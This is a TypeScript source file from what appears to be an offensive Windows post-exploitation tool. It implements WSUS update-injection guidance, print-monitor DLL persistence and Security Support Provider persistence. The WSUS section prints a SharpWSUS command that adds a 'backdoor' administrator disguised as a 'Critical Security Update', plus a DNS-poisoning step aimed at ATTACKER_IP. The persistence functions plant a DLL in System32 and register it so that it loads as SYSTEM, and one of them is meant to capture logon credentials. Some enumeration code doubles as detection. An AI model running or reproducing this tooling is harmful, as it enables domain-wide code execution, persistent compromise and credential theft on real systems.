            details: `WSUS ${wsusUrl} uses HTTP. MITM allows injecting malicious updates as SYSTEM.`,
            remediation: "Configure WSUS to use HTTPS.",
          })
        }
        findings.push({
          checkId: "WIN-WSUS-002",
          provider: "windows",
          severity: "medium",
          status: "INFO",
          resource: wsusUrl,
          title: `WSUS server: ${wsusUrl}`,
          details: "Machine uses WSUS for updates.",
          remediation: "Ensure WSUS server is hardened and uses HTTPS.",
        })
      } else {
        output.push("[*] No WSUS configuration — machine uses Windows Update directly")
      }
      const wuau = await cmd(`reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU"`, timeout)
      if (wuau.exitCode === 0) output.push(`\n[*] Update policy:\n${wuau.stdout}`)
    }
    if (action === "inject") {
      output.push("[*] WSUS injection requires SharpWSUS or WSUSpendu (.NET tools)")
      output.push("[*] Force update check: wuauclt /detectnow /reportnow")
      await cmd("wuauclt /detectnow /reportnow", timeout)
      output.push("[+] Update check triggered")
    }
    if (action === "history") {
      output.push("[*] Update history requires COM objects — use PS exec mode")
      const r = await cmd("wmic qfe list brief /format:table", timeout)
      output.push("[*] Installed hotfixes:\n" + (r.stdout || "(none)"))
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== WSUS Configuration Enumeration ==="

# Registry-based WSUS settings
$wu = Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate' -ErrorAction SilentlyContinue
$wuau = Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU' -ErrorAction SilentlyContinue

if ($wu) {
  $wsusServer = $wu.WUServer
  $wsusStatus = $wu.WUStatusServer
  Write-Output "WSUS Server: $wsusServer"
  Write-Output "WSUS Status Server: $wsusStatus"
  Write-Output "WSUS_URL=$wsusServer"

  # Critical: Check if WSUS uses HTTP (exploitable via MITM)
  if ($wsusServer -and $wsusServer.StartsWith('http://')) {
    Write-Output ""
    Write-Output "[!] CRITICAL: WSUS uses HTTP (not HTTPS)"
    Write-Output "[!] WSUS traffic is vulnerable to MITM attacks"
    Write-Output "[!] An attacker on the network can inject fake updates"
    Write-Output "WSUS_HTTP=1"
  } elseif ($wsusServer -and $wsusServer.StartsWith('https://')) {
    Write-Output ""
    Write-Output "[*] WSUS uses HTTPS — MITM injection not directly possible"
    Write-Output "[*] Check for certificate pinning bypass or compromised CA"
    Write-Output "WSUS_HTTP=0"
  }

  Write-Output ""
  Write-Output "Target Group: $($wu.TargetGroup)"
  Write-Output "TargetGroupEnabled: $($wu.TargetGroupEnabled)"
  Write-Output "DoNotConnectToWindowsUpdateInternetLocations: $($wu.DoNotConnectToWindowsUpdateInternetLocations)"
} else {
  Write-Output "[-] No WSUS configuration found — machine uses Windows Update directly"
  Write-Output "WSUS_URL=NONE"
  Write-Output "WSUS_HTTP=0"
}

if ($wuau) {
  Write-Output ""
  Write-Output "=== Update Policy ==="
  Write-Output "UseWUServer: $($wuau.UseWUServer)"
  Write-Output "NoAutoUpdate: $($wuau.NoAutoUpdate)"
  Write-Output "AUOptions: $(switch ($wuau.AUOptions) { 2 { 'Notify before download' } 3 { 'Auto download, notify install' } 4 { 'Auto download and install' } 5 { 'Allow admin to choose' } default { $wuau.AUOptions } })"
  Write-Output "ScheduledInstallDay: $($wuau.ScheduledInstallDay)"
  Write-Output "ScheduledInstallTime: $($wuau.ScheduledInstallTime)"
}

# Check for recent update activity
Write-Output ""
Write-Output "=== Recent Update History ==="
$session = New-Object -ComObject Microsoft.Update.Session
$searcher = $session.CreateUpdateSearcher()
try {
  $count = $searcher.GetTotalHistoryCount()
  $history = $searcher.QueryHistory(0, [Math]::Min($count, 10))
  foreach ($entry in $history) {
    $status = switch ($entry.ResultCode) { 0 { 'NotStarted' } 1 { 'InProgress' } 2 { 'Succeeded' } 3 { 'SucceededWithErrors' } 4 { 'Failed' } 5 { 'Aborted' } default { $entry.ResultCode } }
    Write-Output "  [$status] $($entry.Date.ToString('yyyy-MM-dd HH:mm')) — $($entry.Title)"
  }
} catch {
  Write-Output "  Could not retrieve update history: $_"
}

# Check WSUS server connectivity
if ($wsusServer) {
  Write-Output ""
  Write-Output "=== WSUS Server Connectivity ==="
  try {
    $uri = [System.Uri]$wsusServer
    $tcpTest = Test-NetConnection -ComputerName $uri.Host -Port $uri.Port -WarningAction SilentlyContinue
    Write-Output "Host: $($uri.Host)"
    Write-Output "Port: $($uri.Port)"
    Write-Output "Reachable: $($tcpTest.TcpTestSucceeded)"
    Write-Output "WSUS_REACHABLE=$(if ($tcpTest.TcpTestSucceeded) { '1' } else { '0' })"
  } catch {
    Write-Output "Connectivity test failed: $_"
    Write-Output "WSUS_REACHABLE=0"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const wsusUrl = r.stdout.match(/WSUS_URL=(.+)/)
    const isHttp = r.stdout.includes("WSUS_HTTP=1")

    if (isHttp && wsusUrl) {
      findings.push({
        checkId: "WIN-WSUS-011",
        provider: "windows",
        severity: "critical",
        status: "VULNERABLE",
        resource: wsusUrl[1],
        title: "WSUS configured over HTTP — vulnerable to update injection",
        details: `WSUS server ${wsusUrl[1]} uses HTTP. An attacker performing ARP spoofing, DNS poisoning, or with network position can inject malicious updates via tools like SharpWSUS or WSUSpendu. This enables domain-wide code execution as SYSTEM.`,
        remediation: "Configure WSUS to use HTTPS (SSL). Set WUServer and WUStatusServer to https:// URLs.",
      })
    }

    if (wsusUrl && wsusUrl[1] !== "NONE") {
      findings.push({
        checkId: "WIN-WSUS-012",
        provider: "windows",
        severity: "medium",
        status: "INFO",
        resource: wsusUrl[1],
        title: `WSUS server configured: ${wsusUrl[1]}`,
        details:
          "Machine receives updates from a WSUS server. If this server is compromised, all clients can receive malicious updates.",
        remediation: "Ensure WSUS server is hardened, uses HTTPS, and has restricted admin access.",
      })
    }
  }

  if (action === "check") {
    const script = `
Write-Output "=== WSUS Attack Surface Assessment ==="

$wu = Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate' -ErrorAction SilentlyContinue
if (-not $wu -or -not $wu.WUServer) {
  Write-Output "[-] No WSUS server configured — attack not applicable"
  Write-Output "ATTACKABLE=0"
  exit
}

$wsusServer = $wu.WUServer
$isHttp = $wsusServer.StartsWith('http://')
Write-Output "WSUS Server: $wsusServer"
Write-Output "Protocol: $(if ($isHttp) { 'HTTP (EXPLOITABLE)' } else { 'HTTPS' })"
Write-Output ""

# Check 1: HTTP MITM
if ($isHttp) {
  Write-Output "[!] ATTACK VECTOR 1: MITM Update Injection"
  Write-Output "    Prerequisite: Network position (ARP spoof, DNS poison, or same subnet)"
  Write-Output "    Tool: SharpWSUS (https://github.com/nettitude/SharpWSUS)"
  Write-Output "    Impact: Execute arbitrary commands as SYSTEM on ALL WSUS clients"
  Write-Output ""
  Write-Output "    Steps:"
  Write-Output "    1. ARP spoof or DNS poison to redirect WSUS traffic"
  Write-Output "    2. SharpWSUS.exe create /payload:C:\\Windows\\System32\\cmd.exe /args:'/c COMMAND' /title:'Security Update'"
  Write-Output "    3. SharpWSUS.exe approve /updateid:UPDATE_GUID /computername:TARGET /groupname:'All Computers'"
  Write-Output "    4. Wait for client to check for updates (or trigger: wuauclt /detectnow)"
  Write-Output ""
}

# Check 2: WSUS server compromise
Write-Output "[*] ATTACK VECTOR 2: WSUS Server Compromise"
$uri = [System.Uri]$wsusServer
Write-Output "    WSUS Host: $($uri.Host)"
Write-Output "    If you compromise this server:"
Write-Output "    - WSUSpendu: Inject updates into WSUS database directly"
Write-Output "    - Modify SUSDB (WID or SQL Server)"
Write-Output "    - All domain machines trust this update source"
Write-Output ""

# Check 3: Local privilege escalation via WSUS
Write-Output "[*] ATTACK VECTOR 3: Local Privesc via WSUS (WSUSpect)"
Write-Output "    If running as local admin but not SYSTEM:"
Write-Output "    - Proxy WSUS traffic through localhost"
Write-Output "    - Inject update that runs as SYSTEM"
Write-Output "    - netsh winhttp set proxy 127.0.0.1:8080"
Write-Output ""

# Network position check
Write-Output "=== Network Position Assessment ==="
$gateway = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Select-Object -First 1).NextHop
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -eq 'Dhcp' -or $_.PrefixOrigin -eq 'Manual' } | Select-Object -First 1).IPAddress
Write-Output "Local IP: $localIP"
Write-Output "Gateway: $gateway"

try {
  $wsusIP = [System.Net.Dns]::GetHostAddresses($uri.Host) | Select-Object -First 1
  Write-Output "WSUS IP: $wsusIP"

  # Same subnet check
  $localParts = $localIP.Split('.')
  $wsusIPParts = ($wsusIP.ToString()).Split('.')
  $sameSubnet = ($localParts[0] -eq $wsusIPParts[0]) -and ($localParts[1] -eq $wsusIPParts[1]) -and ($localParts[2] -eq $wsusIPParts[2])
  Write-Output "Same Subnet: $(if ($sameSubnet) { 'YES (ARP spoofing feasible)' } else { 'NO (need routing-level MITM)' })"
} catch {
  Write-Output "Could not resolve WSUS server IP"
}

Write-Output ""
Write-Output "ATTACKABLE=$(if ($isHttp) { '1' } else { '0' })"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("ATTACKABLE=1")) {
      findings.push({
        checkId: "WIN-WSUS-010",
        provider: "windows",
        severity: "critical",
        status: "EXPLOITABLE",
        resource: "wsus://mitm",
        title: "WSUS MITM attack feasible — HTTP update channel",
        details:
          "WSUS uses HTTP, allowing update injection via network MITM. Use SharpWSUS or WSUSpendu for domain-wide SYSTEM execution.",
        remediation: "Migrate WSUS to HTTPS. As interim, enable certificate pinning.",
      })
    }
  }

  if (action === "inject") {
    output.push("=== WSUS Update Injection ===")
    output.push("")
    output.push("[!] Direct WSUS injection requires SharpWSUS or WSUSpendu (compiled .NET tools)")
    output.push("[*] PowerShell-only injection is not reliable — use the following workflow:")
    output.push("")
    output.push("Step 1: Verify HTTP WSUS")
    output.push("  winhook wsus_abuse --action check")
    output.push("")
    output.push("Step 2: Set up MITM (if network position allows)")
    output.push("  # ARP spoof: winhook responder_poison --action poison")
    output.push("  # Or DNS poison: winhook adidns_poison --action inject --name WSUS_HOSTNAME --ip ATTACKER_IP")
    output.push("")
    output.push("Step 3: Use SharpWSUS on attacker machine")
    output.push(
      '  SharpWSUS.exe create /payload:"C:\\Windows\\System32\\cmd.exe" /args:"/c net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add" /title:"Critical Security Update"',
    )
    output.push("  SharpWSUS.exe approve /updateid:GUID /computername:TARGET")
    output.push("")
    output.push("Step 4: Force client update check")

    const r = await ps(`wuauclt /detectnow /reportnow 2>&1; Write-Output "Update check triggered"`, timeout)
    output.push(`  ${r.stdout.trim()}`)
    output.push("")
    output.push("Step 5: Monitor")
    output.push("  SharpWSUS.exe check /updateid:GUID /computername:TARGET")
  }

  if (action === "history") {
    const script = `
Write-Output "=== Full WSUS Update History ==="
$session = New-Object -ComObject Microsoft.Update.Session
$searcher = $session.CreateUpdateSearcher()
try {
  $count = $searcher.GetTotalHistoryCount()
  Write-Output "Total updates: $count"
  Write-Output ""
  $history = $searcher.QueryHistory(0, $count)
  foreach ($entry in $history) {
    $status = switch ($entry.ResultCode) { 0 { 'NotStarted' } 1 { 'InProgress' } 2 { 'OK' } 3 { 'Partial' } 4 { 'FAILED' } 5 { 'Aborted' } default { $entry.ResultCode } }
    $type = switch ($entry.Operation) { 1 { 'Install' } 2 { 'Uninstall' } default { 'Other' } }
    Write-Output "[$status] $($entry.Date.ToString('yyyy-MM-dd HH:mm')) [$type] $($entry.Title)"
    if ($entry.UnmappedResultCode -ne 0) {
      Write-Output "    Error: 0x$($entry.UnmappedResultCode.ToString('X8'))"
    }
  }
} catch {
  Write-Output "Error: $_"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function printMonitorPersist(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const name = argVal(args, "--name") || "CyberStrikeMon"
  const dllPath = argVal(args, "--dll")
  const monType = argVal(args, "--type") || "monitor"
  const findings: Finding[] = []
  const output: string[] = ["[*] Print Monitor/Port Monitor persistence...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Print Monitor Persistence (cmd.exe) ===\n")
    if (action === "enum") {
      const r = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors"`, timeout)
      output.push("[*] Registered print monitors:\n" + (r.stdout || "(none)"))
      const spooler = await cmd("sc query Spooler", timeout)
      output.push("\n[*] Print Spooler:\n" + spooler.stdout)
    }
    if (action === "install") {
      if (!dllPath) {
        output.push("ERROR: --dll required")
        return { output: output.join("\n"), findings }
      }
      const dllName = dllPath.split("\\").pop() || dllPath
      const copy = await cmd(`copy "${dllPath}" "%SystemRoot%\\System32\\${dllName}" /Y`, timeout)
      output.push(copy.exitCode === 0 ? `[+] DLL copied to System32` : `[!] Copy failed: ${copy.stderr}`)
      const regKey = `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}`
      const r = await cmd(`reg add "${regKey}" /v "Driver" /t REG_SZ /d "${dllName}" /f`, timeout)
      output.push(
        r.exitCode === 0
          ? `[+] Print monitor registered: ${name}\n    Driver: ${dllName}`
          : `[!] Registry failed: ${r.stderr}`,
      )
      const restart = await cmd("net stop Spooler && net start Spooler", timeout)
      output.push(
        restart.exitCode === 0
          ? "[+] Spooler restarted — DLL loaded as SYSTEM"
          : `[!] Spooler restart: ${restart.stderr}`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-PMON-010",
          provider: "windows",
          severity: "critical",
          status: "PERSISTED",
          resource: `spooler://${name}`,
          title: `Print monitor installed: ${name}`,
          details: `DLL loaded by spoolsv.exe as SYSTEM. Survives reboots.`,
          remediation: `Remove: reg delete "${regKey}" /f && del "%SystemRoot%\\System32\\${dllName}"`,
        })
    }
    if (action === "remove") {
      const driver = await cmd(
        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}" /v "Driver"`,
        timeout,
      )
      const dllName = driver.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim()
      await cmd(`reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}" /f`, timeout)
      if (dllName) await cmd(`del "%SystemRoot%\\System32\\${dllName}"`, timeout)
      await cmd("net stop Spooler && net start Spooler", timeout)
      output.push(`[+] Print monitor '${name}' removed`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Print Monitor Enumeration ==="
Write-Output ""

# Enumerate print monitors
Write-Output "--- Print Monitors (HKLM\\SYSTEM\\CCS\\Control\\Print\\Monitors) ---"
$monPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors'
$monitors = Get-ChildItem $monPath -ErrorAction SilentlyContinue
$monCount = 0
foreach ($mon in $monitors) {
  $monCount++
  $driver = (Get-ItemProperty "$($mon.PSPath)" -Name Driver -ErrorAction SilentlyContinue).Driver
  Write-Output "  $($mon.PSChildName)"
  Write-Output "    Driver DLL: $driver"
  if ($driver) {
    $dllFullPath = "$env:SystemRoot\\System32\\$driver"
    if (Test-Path $dllFullPath) {
      $info = Get-Item $dllFullPath
      Write-Output "    Size: $($info.Length) bytes"
      Write-Output "    Modified: $($info.LastWriteTime)"
      $sig = Get-AuthenticodeSignature $dllFullPath -ErrorAction SilentlyContinue
      Write-Output "    Signed: $(if ($sig.Status -eq 'Valid') { "$($sig.SignerCertificate.Subject)" } else { 'UNSIGNED [!]' })"
    } else {
      Write-Output "    [!] DLL NOT FOUND at expected path"
    }
  }
  Write-Output ""
}
Write-Output "MONITOR_COUNT=$monCount"

# Enumerate port monitors
Write-Output "--- Port Monitors (HKLM\\SYSTEM\\CCS\\Control\\Print\\Monitors\\*\\Ports) ---"
$portCount = 0
foreach ($mon in $monitors) {
  $ports = Get-ChildItem "$($mon.PSPath)\\Ports" -ErrorAction SilentlyContinue
  foreach ($port in $ports) {
    $portCount++
    Write-Output "  $($mon.PSChildName)\\$($port.PSChildName)"
  }
}
Write-Output "PORT_COUNT=$portCount"
Write-Output ""

# Print Spooler service status
Write-Output "=== Print Spooler Service ==="
$spooler = Get-Service Spooler
Write-Output "Status: $($spooler.Status)"
Write-Output "StartType: $($spooler.StartType)"
Write-Output "SPOOLER_RUNNING=$(if ($spooler.Status -eq 'Running') { '1' } else { '0' })"

# Check if current user can modify monitors
Write-Output ""
Write-Output "=== Permissions ==="
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Output "Is Admin: $isAdmin"
Write-Output "CAN_INSTALL=$(if ($isAdmin) { '1' } else { '0' })"

# Check for suspicious unsigned monitors
$unsigned = 0
foreach ($mon in $monitors) {
  $driver = (Get-ItemProperty "$($mon.PSPath)" -Name Driver -ErrorAction SilentlyContinue).Driver
  if ($driver) {
    $dllFullPath = "$env:SystemRoot\\System32\\$driver"
    if (Test-Path $dllFullPath) {
      $sig = Get-AuthenticodeSignature $dllFullPath -ErrorAction SilentlyContinue
      if ($sig.Status -ne 'Valid') { $unsigned++ }
    }
  }
}
if ($unsigned -gt 0) {
  Write-Output ""
  Write-Output "[!] Found $unsigned unsigned monitor DLLs — possible existing persistence"
  Write-Output "UNSIGNED=$unsigned"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const unsigned = r.stdout.match(/UNSIGNED=(\d+)/)
    if (unsigned && parseInt(unsigned[1]) > 0) {
      findings.push({
        checkId: "WIN-PMON-001",
        provider: "windows",
        severity: "high",
        status: "SUSPICIOUS",
        resource: "spooler://monitors",
        title: `${unsigned[1]} unsigned print monitor DLL(s) found — possible existing persistence`,
        details:
          "Unsigned DLLs in print monitor registry may indicate existing malicious persistence. Legitimate monitors are typically signed by their vendor.",
        remediation: "Investigate unsigned monitor DLLs, verify against known-good baseline.",
      })
    }
  }

  if (action === "install") {
    if (!dllPath) {
      output.push("ERROR: --dll required (path to DLL to register as print monitor)")
      output.push("")
      output.push("The DLL must export these functions:")
      output.push("  - InitializePrintMonitor2 (for print monitors)")
      output.push("  - InitializePortMonitor (for port monitors)")
      output.push("")
      output.push("Or use a payload DLL that runs code in DllMain on PROCESS_ATTACH.")
      output.push("The DLL will be loaded by spoolsv.exe (SYSTEM context) on service start.")
      return { output: output.join("\n"), findings }
    }

    const regPath =
      monType === "port"
        ? `HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}\\Ports`
        : `HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}`

    const script = `
Write-Output "=== Installing ${monType === "port" ? "Port" : "Print"} Monitor ==="
Write-Output "Name: ${name}"
Write-Output "DLL: ${dllPath}"
Write-Output ""

# Verify admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
  Write-Output "[-] ERROR: Administrator privileges required"
  Write-Output "STATUS=FAILED"
  exit
}

# Verify DLL exists
if (-not (Test-Path '${dllPath}')) {
  Write-Output "[-] DLL not found: ${dllPath}"
  Write-Output "STATUS=FAILED"
  exit
}

# Copy DLL to System32 (required location for print monitors)
$dllName = [System.IO.Path]::GetFileName('${dllPath}')
$destPath = "$env:SystemRoot\\System32\\$dllName"
Copy-Item '${dllPath}' $destPath -Force
Write-Output "[+] DLL copied to: $destPath"

# Create registry key
$regPath = '${regPath}'
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path '${regPath.replace("\\Ports", "")}' -Name Driver -Value $dllName -Type String

Write-Output "[+] Registry key created: ${regPath.replace("\\Ports", "").replace("HKLM:\\", "HKLM\\")}"
Write-Output "[+] Driver value set to: $dllName"
Write-Output ""

# Restart Spooler to load the monitor
Write-Output "[*] Restarting Print Spooler service to load monitor..."
Restart-Service Spooler -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
$spooler = Get-Service Spooler
Write-Output "[+] Spooler Status: $($spooler.Status)"

# Verify DLL is loaded
$spoolPid = (Get-Process spoolsv -ErrorAction SilentlyContinue).Id
if ($spoolPid) {
  $loaded = Get-Process -Id $spoolPid -Module -ErrorAction SilentlyContinue | Where-Object { $_.ModuleName -eq $dllName }
  if ($loaded) {
    Write-Output "[+] DLL confirmed loaded in spoolsv.exe (PID: $spoolPid)"
    Write-Output "STATUS=SUCCESS"
  } else {
    Write-Output "[*] DLL not immediately visible in modules (may still be loaded)"
    Write-Output "STATUS=INSTALLED"
  }
} else {
  Write-Output "[-] Spooler process not found after restart"
  Write-Output "STATUS=SPOOLER_FAILED"
}

Write-Output ""
Write-Output "[+] Persistence installed: DLL loads as SYSTEM on every Spooler start"
Write-Output "[*] Survives reboots (Spooler is auto-start)"
Write-Output "[*] Cleanup: winhook print_monitor_persist --action remove --name '${name}'"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS") || r.stdout.includes("STATUS=INSTALLED")) {
      findings.push({
        checkId: "WIN-PMON-011",
        provider: "windows",
        severity: "critical",
        status: "PERSISTED",
        resource: `spooler://${name}`,
        title: `Print monitor persistence installed: ${name}`,
        details: `DLL registered as ${monType} monitor, loaded by spoolsv.exe as SYSTEM. Survives reboots.`,
        remediation: `Remove: winhook print_monitor_persist --action remove --name '${name}'`,
      })
    }
  }

  if (action === "remove") {
    const script = `
Write-Output "=== Removing Print Monitor ==="

$regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}'

# Get DLL name before removing
$driver = (Get-ItemProperty $regPath -Name Driver -ErrorAction SilentlyContinue).Driver
if (-not $driver) {
  Write-Output "[-] Monitor '${name}' not found"
  exit
}

# Remove registry key
Remove-Item $regPath -Recurse -Force -ErrorAction SilentlyContinue
Write-Output "[+] Registry key removed: $regPath"

# Remove DLL from System32
$dllPath = "$env:SystemRoot\\System32\\$driver"
if (Test-Path $dllPath) {
  Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
  Write-Output "[+] DLL removed: $dllPath"
}

# Restart Spooler
Restart-Service Spooler -Force -ErrorAction SilentlyContinue
Write-Output "[+] Spooler restarted"
Write-Output "[+] Monitor '${name}' removed successfully"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function sspPersist(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const name = argVal(args, "--name") || "CyberStrikeSSP"
  const method = argVal(args, "--method") || "api"
  const findings: Finding[] = []
  const output: string[] = ["[*] Security Support Provider (SSP) operations...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== SSP Operations (cmd.exe) ===\n")
    if (action === "enum") {
      const r = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages"`, timeout)
      output.push("[*] Registered SSPs:\n" + (r.stdout || "(query failed)"))
      const known = ["kerberos", "msv1_0", "schannel", "wdigest", "tspkg", "pku2u", "cloudap", "negoexts", "negotiate"]
      const pkgs =
        r.stdout
          .match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]
          ?.trim()
          .split(/\s+/) || []
      const nonStd = pkgs.filter((p: string) => p && !known.includes(p.toLowerCase().replace(/\0/g, "")))
      if (nonStd.length > 0) {
        output.push(`\n[!] Non-standard SSPs: ${nonStd.join(", ")}`)
        findings.push({
          checkId: "WIN-SSP-001",
          provider: "windows",
          severity: "critical",
          status: "SUSPICIOUS",
          resource: "lsa://ssp",
          title: `${nonStd.length} non-standard SSP(s) found`,
          details: "Non-standard SSPs may capture plaintext credentials.",
          remediation: "Remove unknown SSPs from HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Security Packages.",
        })
      }
    }
    if (action === "install") {
      if (!dll) {
        output.push("ERROR: --dll required")
        return { output: output.join("\n"), findings }
      }
      const dllName = dll.replace(/\\/g, "/").split("/").pop()?.replace(".dll", "") || name
      const copy = await cmd(`copy "${dll}" "%SystemRoot%\\System32\\" /Y`, timeout)
      output.push(copy.exitCode === 0 ? `[+] DLL copied to System32` : `[!] Copy failed: ${copy.stderr}`)
      if (method === "registry") {
        const r = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages"`, timeout)
        const current = r.stdout.match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]?.trim() || ""
        const addCmd = `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "${current}\\0${dllName}" /f`
        const add = await cmd(addCmd, timeout)
        output.push(
          add.exitCode === 0
            ? `[+] SSP '${dllName}' added to registry — reboot required`
            : `[!] Registry add failed: ${add.stderr}`,
        )
        if (add.exitCode === 0)
          findings.push({
            checkId: "WIN-SSP-010",
            provider: "windows",
            severity: "critical",
            status: "INSTALLED",
            resource: `lsa://ssp/${name}`,
            title: `SSP installed: ${name}`,
            details: `SSP DLL registered via registry. Captures credentials after reboot.`,
            remediation: `Remove from Security Packages registry.`,
          })
      } else {
        output.push("[*] API-based SSP loading requires PS — use registry method or PS exec mode")
      }
    }
    if (action === "remove") {
      output.push("[*] To remove SSP via cmd.exe:")
      output.push(`    1. reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages"`)
      output.push(`    2. reg add with updated value excluding the target SSP`)
      output.push(`    3. del "%SystemRoot%\\System32\\${name}.dll"`)
      output.push("[*] For precise REG_MULTI_SZ editing, use PowerShell exec mode")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Registered Security Support Providers ==="
Write-Output ""

# Registry SSPs (loaded on boot)
$sspKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$ssps = (Get-ItemProperty $sspKey -Name 'Security Packages' -ErrorAction SilentlyContinue).'Security Packages'
Write-Output "Registry SSPs (HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Security Packages):"
$sspCount = 0
foreach ($s in $ssps) {
  if ($s.Trim()) {
    $sspCount++
    $dllPath = "$env:SystemRoot\\System32\\$s.dll"
    $exists = Test-Path $dllPath
    $sig = if ($exists) { (Get-AuthenticodeSignature $dllPath -ErrorAction SilentlyContinue).Status } else { 'N/A' }
    $signed = if ($sig -eq 'Valid') { 'Signed' } else { 'UNSIGNED [!]' }
    Write-Output "  $s — $(if ($exists) { "$signed" } else { 'DLL NOT FOUND [!]' })"
  }
}
Write-Output "SSP_COUNT=$sspCount"
Write-Output ""

# OSConfig SSPs
$osConfig = (Get-ItemProperty $sspKey -Name 'OSConfig\\Security Packages' -ErrorAction SilentlyContinue)
if ($osConfig) {
  Write-Output "OSConfig SSPs:"
  foreach ($s in $osConfig.'Security Packages') {
    if ($s.Trim()) { Write-Output "  $s" }
  }
  Write-Output ""
}

# Currently loaded SSPs (via EnumerateSecurityPackages)
Write-Output "=== Currently Loaded Security Packages ==="
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SSPEnum {
  [DllImport("secur32.dll")]
  public static extern int EnumerateSecurityPackagesW(out int pcPackages, out IntPtr ppPackageInfo);
  [DllImport("secur32.dll")]
  public static extern int FreeContextBuffer(IntPtr pvContextBuffer);

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct SecPkgInfo {
    public int fCapabilities;
    public short wVersion;
    public short wRPCID;
    public int cbMaxToken;
    public string Name;
    public string Comment;
  }

  public static string[] GetPackages() {
    int count; IntPtr buf;
    if (EnumerateSecurityPackagesW(out count, out buf) == 0) {
      var names = new string[count];
      int size = Marshal.SizeOf(typeof(SecPkgInfo));
      for (int i = 0; i < count; i++) {
        var info = (SecPkgInfo)Marshal.PtrToStructure(IntPtr.Add(buf, i * size), typeof(SecPkgInfo));
        names[i] = info.Name;
      }
      FreeContextBuffer(buf);
      return names;
    }
    return new string[0];
  }
}
"@ -ErrorAction SilentlyContinue

try {
  $loaded = [SSPEnum]::GetPackages()
  foreach ($p in $loaded) { Write-Output "  $p" }
  Write-Output ""
  Write-Output "LOADED_COUNT=$($loaded.Length)"
} catch {
  Write-Output "  (enumeration requires Add-Type — may be blocked by CLM)"
}

# Check for known malicious SSPs
Write-Output ""
Write-Output "=== Suspicious SSP Check ==="
$known = @('kerberos', 'msv1_0', 'schannel', 'wdigest', 'tspkg', 'pku2u', 'cloudap', 'negoexts', 'negotiate')
$suspicious = 0
foreach ($s in $ssps) {
  $trimmed = $s.Trim().ToLower()
  if ($trimmed -and $trimmed -notin $known) {
    Write-Output "[!] Non-standard SSP: $s"
    $suspicious++
  }
}
if ($suspicious -eq 0) { Write-Output "[*] All SSPs appear standard" }
Write-Output "SUSPICIOUS=$suspicious"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const suspicious = r.stdout.match(/SUSPICIOUS=(\d+)/)
    if (suspicious && parseInt(suspicious[1]) > 0) {
      findings.push({
        checkId: "WIN-SSP-011",
        provider: "windows",
        severity: "critical",
        status: "SUSPICIOUS",
        resource: "lsa://ssp",
        title: `${suspicious[1]} non-standard SSP(s) found — possible credential capture`,
        details:
          "Non-standard Security Support Providers in LSASS may be capturing plaintext credentials on every logon.",
